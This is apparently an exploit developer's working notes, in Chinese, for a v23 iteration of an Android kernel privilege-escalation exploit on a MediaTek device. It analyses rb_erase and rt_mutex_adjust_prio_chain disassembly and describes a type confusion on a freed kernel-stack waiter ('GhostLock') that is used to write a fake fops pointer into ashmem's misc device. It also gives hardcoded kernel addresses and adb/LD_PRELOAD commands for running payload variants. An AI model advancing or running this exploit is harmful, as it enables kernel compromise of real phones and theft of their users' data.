# v23 分析与测试计划

## rb_erase 反汇编分析总结

### 关键发现

rb_erase (0xffffffc008a71228) 有 3 条主要路径：

| 路径 | 条件 | child 来源 | 写入目标 | 写入值 |
|------|------|-----------|---------|--------|
| Path A | right=NULL, left≠NULL | node->rb_left | parent->rb_left 或 rb_right | tree_left |
| Path B | left=NULL, right≠NULL | node->rb_right | parent->rb_left 或 rb_right | tree_right |
| Path C | 两者都非NULL | 后继节点 | 复杂旋转 | 复杂 |

### v18 (ret=78) 分析

- tree_pc = ASHMEM_MISC_OFF (= 0xffffff80028e76d8), parent = ASHMEM_MISC_OFF
- tree_left ≠ 0 (可能是 ASHMEM_MISC_FOPS)
- → 走 Path A, 写入 tree_left 到 parent->rb_left (= name field)
- rb_erase 被触发 ✅, 但写到错误偏移 (name, 不是 fops) ❌
- __rb_erase_color 修改了栈上 fd_set (78 bits) ← 证明 rb tree 操作发生了

### v22 (ret=0) 分析

- tree_pc = ASHMEM_MISC_FOPS - 8 (= 0xffffff80028e76e0), parent = 0xffffff80028e76e0
- tree_left = 0, tree_right = fake_fops
- → 应走 Path B, 写入 fake_fops 到 parent->rb_left (= [ASHMEM_MISC_FOPS] = fops field!)
- 但 rb_erase 未被触发 → ret=0, misc_fops=0

### 根因假设

在 `rt_mutex_adjust_prio_chain` 中，rb_erase 的触发取决于 lock->waiters 树中是否找到对应 waiter。
检查逻辑：
```
ldr x8, [lock, #0x10]     ; lock->waiters.leftmost (第一个waiter)
cbz x8, skip               ; 如果为空，跳过
ldr x9, [x8, #0x38]        ; waiter->lock
cmp x9, lock                ; waiter->lock == lock?
b.ne skip                   ; 不匹配则跳过
```

**幽灵锁 (GhostLock) 的类型混淆机制：**
waiter 结构体在 waiter 线程的内核栈上创建 (FUTEX_LOCK_PI 时)。
pselect 线程的 fd_set 在其自己的内核栈上。
consumer 用 sched_setattr(waiter_tid) 触发对 WAITER 线程的 PI 优先级调整。
rt_mutex_adjust_prio_chain 读取 waiter_task->pi_blocked_on →
指向 waiter 线程内核栈上的**真实** waiter 结构体。

类型混淆可能发生在：
- waiter 线程的内核栈被释放并重用 (UAF on kernel stack)
- pi_blocked_on 指针变陈旧，指向已释放的栈内存
- pselect 的栈帧恰好复用了同一块栈内存

这解释了为什么不同 tree_pc 值行为不同：
- tree_pc = ASHMEM_MISC_OFF (v18): 作为 rb_parent 值，被内核接受为"在树中" → rb_erase 触发
- tree_pc = ASHMEM_MISC_FOPS - 8 (v22): 作为 rb_parent 值，不被接受 → rb_erase 不触发

### v23 策略

**默认 (v23):** tree_pc = ASHMEM_MISC_OFF | RED (v18 确认触发 rb_erase)
**ALT (PSELECT_V23_ALT=1):** tree_pc = (ASHMEM_MISC_FOPS - 8) | RED (v22 直接写 fops 策略)

## 测试命令

### 推送 v23
```cmd
adb push preload_mtk_v23.so /data/local/tmp/preload.so
adb shell chmod 0644 /data/local/tmp/preload.so
```

### 测试 1: v23 默认 (tree_pc = ashmem_off | RED)
```cmd
adb shell "LD_PRELOAD=/data/local/tmp/preload.so /system/bin/sleep 10" 2>&1 | tee v23_test1.txt
```

### 测试 2: v23 ALT (tree_pc = ashmem_dmap-8 | RED, 直接fops写入)
```cmd
adb shell "PSELECT_V23_ALT=1 LD_PRELOAD=/data/local/tmp/preload.so /system/bin/sleep 10" 2>&1 | tee v23_test2.txt
```

### 测试 3: v23 + PSELECT_TARGET=pselect (target pselect线程本身)
```cmd
adb shell "PSELECT_TARGET=pselect LD_PRELOAD=/data/local/tmp/preload.so /system/bin/sleep 10" 2>&1 | tee v23_test3.txt
```

### 测试 4: v23 + safe mode (验证基线不崩溃)
```cmd
adb shell "PSELECT_TPC_SAFE=1 LD_PRELOAD=/data/local/tmp/preload.so /system/bin/sleep 10" 2>&1 | tee v23_test4.txt
```

### 测试 5: 手动 tree_pc 扫描
```cmd
:: 尝试 v18 的确切值 (ASHMEM_MISC_OFF + RED)
adb shell "PSELECT_TREE_PC=ffffff80028e76d9 PSELECT_TREE_RIGHT=ffffff81670f8180 PSELECT_TREE_LEFT=0 LD_PRELOAD=/data/local/tmp/preload.so /system/bin/sleep 10" 2>&1

:: 尝试 ASHMEM_MISC_FOPS 本身
adb shell "PSELECT_TREE_PC=ffffff80028e76e9 PSELECT_TREE_RIGHT=ffffff81670f8180 PSELECT_TREE_LEFT=0 LD_PRELOAD=/data/local/tmp/preload.so /system/bin/sleep 10" 2>&1
```

## 如果 v23 仍不工作 → v24 方向

1. 在 `rt_mutex_adjust_prio_chain` 入口加 kprobe/tracepoint 确认是否被调用
2. 直接 dump `waiter_task->pi_blocked_on` 确认指针值
3. 在 `rb_erase` 入口加 hook 确认是否被调用及参数
4. 尝试 pi_tree 路径 (pi_tree_entry 而不是 tree_entry)
5. 在内核模块中手动触发 rb_erase 测试写入目标

## v23 SHA256
```
c11c881698626a8cb9abb21116f67db77bd9f055d9cf11bc2759188da31e1739  preload_mtk_v23.so
```

## 反汇编文件
- `rb_erase.asm` — rb_erase 完整反汇编 (386行)
- `rt_mutex_chain.asm` — rt_mutex_adjust_prio_chain 完整反汇编 (1632行)
